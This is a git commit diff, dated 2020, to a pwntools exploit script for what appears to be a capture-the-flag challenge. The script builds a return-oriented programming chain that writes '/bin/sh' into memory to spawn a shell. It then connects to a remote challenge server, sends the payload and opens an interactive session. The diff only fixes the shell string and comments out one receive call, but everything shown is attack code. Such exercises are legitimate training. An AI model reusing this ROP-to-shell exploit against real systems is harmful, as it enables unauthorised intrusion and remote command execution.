f6aa6d98f43606c370258933fc0ba5357fa1cea9
nucktwillieren <nucktwillieren@gmail.com>
2020-12-16 11:57:36 +0800

    p7

--- mid/p7/p7.py
+++ mid/p7/p7.py
@@ -7,7 +7,7 @@ p = b''
 p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
 p += pack('<Q', 0x00000000006ba0e0) # @ .data
 p += pack('<Q', 0x000000000044a30c) # pop rax ; ret
-p += b'/bin//sh'
+p += b'/bin/sh'
 p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
 p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
 p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
@@ -86,7 +86,7 @@ context(arch = 'i386', os = 'linux')
 #r = process('./ec')
 r = remote('ctf.adl.tw', 11006)
 # EXPLOIT CODE GOES HERE
-r.recvline()
+#r.recvline()
 r.send(p)
 r.recvline()
 r.interactive()
